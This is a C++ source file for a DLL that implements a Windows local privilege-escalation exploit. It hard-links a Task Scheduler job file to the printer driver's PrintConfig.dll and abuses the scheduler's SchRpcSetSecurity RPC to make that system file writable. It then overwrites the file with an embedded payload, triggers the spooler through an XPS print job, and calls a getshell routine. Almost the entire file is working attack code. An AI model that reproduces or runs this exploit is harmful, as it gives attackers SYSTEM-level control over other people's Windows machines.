// exp.cpp : 定义 DLL 应用程序的导出函数。
//

#include "stdafx.h"
#include "resource.h"
#include "rpc_h.h"
#include <xpsprint.h>
#include <string>

#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "XpsPrint.lib")

extern "C" void __RPC_FAR * __RPC_USER MIDL_user_allocate(size_t len)
{
	return (malloc(len));
}

extern "C" void __RPC_USER MIDL_user_free(void __RPC_FAR * ptr)
{
	free(ptr);
}

RPC_STATUS CreateBindingHandle(RPC_BINDING_HANDLE *binding_handle)
{
	RPC_STATUS status;
	RPC_WSTR stringBinding = nullptr;	
	RPC_BINDING_HANDLE binding = nullptr;
	RPC_BINDING_HANDLE v5 = nullptr;
	RPC_SECURITY_QOS securityQOS = { 0 };

	status = RpcStringBindingCompose(nullptr, L"ncalrpc", nullptr, nullptr, nullptr, &stringBinding);
	if (status == RPC_S_OK)
	{
		status = RpcBindingFromStringBinding(stringBinding, &binding);
		RpcStringFree(&stringBinding);
		if (status == RPC_S_OK)
		{
			securityQOS.Version = 1;
			securityQOS.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
			securityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_DEFAULT;
			securityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_STATIC;

			status = RpcBindingSetAuthInfoEx(binding, 0, 6u, 0xAu, 0, 0, (RPC_SECURITY_QOS*)&securityQOS);
			if (status == RPC_S_OK)
			{
				v5 = binding;
				binding = 0;
				*binding_handle = v5;
			}
		}
	}

	if (binding)
	{
		RpcBindingFree(&binding);
	}

	return status;
}


bool CreateNativeHardlink(LPCWSTR linkname, LPCWSTR targetname);

void RunExploit()
{
	RPC_BINDING_HANDLE handle;
	RPC_STATUS status = CreateBindingHandle(&handle);
	
	/*
	// AceType;AceFlags;AccessMask;SID
	D:								// DACL-String
	(A;;FA;;;BA)					// Allow File_ALL_ACCESS BUILTIN_ADMINISTRATORS
	(A;OICIIO;GA;;;BA)				// Allow Generic_ALL BUILTIN_ADMINISTRATORS
	(A;;FA;;;SY)					// Allow File_ALL_ACCESS LOCAL_SYSTEM 
	(A;OICIIO;GA;;;SY)				// Allow Generic_ALL LOCAL_SYSTEM
	(A;;0x1301bf;;;AU)				// Allow 0x1301bf AUTHENTICATED_USERS
	(A;OICIIO;SDGXGWGR;;;AU)		// Allow Delete Generic_Excute Generic_Write Generic_Read AUTHENTICATED_USERS
	(A;;0x1200a9;;;BU)				// Allow File_Read Write_Property BUILTIN_USERS
	(A;OICIIO;GXGR;;;BU)			// Allow Generic_Excute Generic_Read BUILTIN_USERS
	*/
	
	SchRpcCreateFolder(handle, L"UpdateTask", L"D:(A;;FA;;;BA)(A;OICIIO;GA;;;BA)(A;;FA;;;SY)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;AU)(A;OICIIO;SDGXGWGR;;;AU)(A;;0x1200a9;;;BU)(A;OICIIO;GXGR;;;BU)", 0);
	SchRpcSetSecurity(handle, L"UpdateTask", L"D:(A;;FA;;;BA)(A;OICIIO;GA;;;BA)(A;;FA;;;SY)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;AU)(A;OICIIO;SDGXGWGR;;;AU)(A;;0x1200a9;;;BU)(A;OICIIO;GXGR;;;BU)", 0);
}

DWORD getshell();

int main()
{
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind;
	hFind = FindFirstFile(L"C:\\Windows\\System32\\DriverStore\\FileRepository\\prnms003.inf_amd64*", &FindFileData);
	wchar_t BeginPath[MAX_PATH] = L"c:\\windows\\system32\\DriverStore\\FileRepository\\";
	wchar_t PrinterDriverFolder[MAX_PATH] = { 0 };
	wchar_t EndPath[23] = L"\\Amd64\\PrintConfig.dll";
	wmemcpy(PrinterDriverFolder, FindFileData.cFileName, wcslen(FindFileData.cFileName));
	FindClose(hFind);
	wcscat_s(BeginPath, PrinterDriverFolder);
	wcscat_s(BeginPath, EndPath);

	CreateNativeHardlink(L"c:\\windows\\tasks\\UpdateTask.job", BeginPath);

	RunExploit();

	HRSRC myResource = ::FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
	unsigned int myResourceSize = ::SizeofResource(NULL, myResource);
	HGLOBAL myResourceData = ::LoadResource(NULL, myResource);
	void* pMyBinaryData = ::LockResource(myResourceData);

	HANDLE hFile;
	DWORD dwBytesWritten = 0;
	do {
		hFile = CreateFile(BeginPath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		WriteFile(hFile, (char*)pMyBinaryData, myResourceSize, &dwBytesWritten, NULL);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			Sleep(5000);
		}
	} while (hFile == INVALID_HANDLE_VALUE);
	CloseHandle(hFile);

	CoInitialize(nullptr);
	IXpsOMObjectFactory *xpsFactory = NULL;
	CoCreateInstance(__uuidof(XpsOMObjectFactory), NULL, CLSCTX_INPROC_SERVER, __uuidof(IXpsOMObjectFactory), reinterpret_cast<LPVOID*>(&xpsFactory));
	HANDLE completionEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	IXpsPrintJob *job = NULL;
	IXpsPrintJobStream *jobStream = NULL;
	StartXpsPrintJob(L"Microsoft XPS Document Writer", L"Print Job 1", NULL, NULL, completionEvent, NULL, 0, &job, &jobStream, NULL);
	if (jobStream)
	{
		jobStream->Close();
	}

	CoUninitialize();

	getshell();

	return 0;
}


DWORD CALLBACK ExploitThread(LPVOID hModule)
{
	main();
	FreeLibraryAndExitThread((HMODULE)hModule, 0);
	return 0;
}